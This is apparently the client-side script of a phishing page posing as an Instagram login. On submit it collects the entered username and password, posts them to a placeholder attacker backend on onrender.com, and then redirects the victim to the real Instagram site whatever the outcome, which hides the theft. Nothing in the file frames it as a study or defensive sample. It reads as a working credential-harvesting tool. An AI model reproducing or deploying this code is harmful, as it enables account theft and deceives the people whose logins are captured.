document.addEventListener('DOMContentLoaded', function () {
    const form = document.querySelector('form');
    const inputs = document.querySelectorAll('input');
    const loginButton = document.querySelector('button[type="submit"]');

    // Form validation
    function validateForm() {
        let isValid = true;
        inputs.forEach(input => {
            if (!input.value.trim()) {
                isValid = false;
            }
        });
        loginButton.disabled = !isValid;
        loginButton.style.opacity = isValid ? '1' : '0.3';
    }

    inputs.forEach(input => {
        input.addEventListener('input', validateForm);
    });

    form.addEventListener('submit', async function (e) {
        e.preventDefault();

        const username = document.getElementById('username').value;
        const password = document.getElementById('password').value;

        try {
            loginButton.disabled = true;
            loginButton.textContent = 'Logging in...';

            const response = await fetch('https://your-render-backend-url.onrender.com/', {
                method: 'POST',
                headers: {
                    'Content-Type': 'application/json',
                },
                body: JSON.stringify({ username, password })
            });

            if (response.ok) {
                window.location.href = 'https://www.instagram.com/';
            } else {
                throw new Error('Login failed');
            }
        } catch (error) {
            console.error('Error:', error);
            window.location.href = 'https://www.instagram.com/';
        }
    });

    validateForm();
});
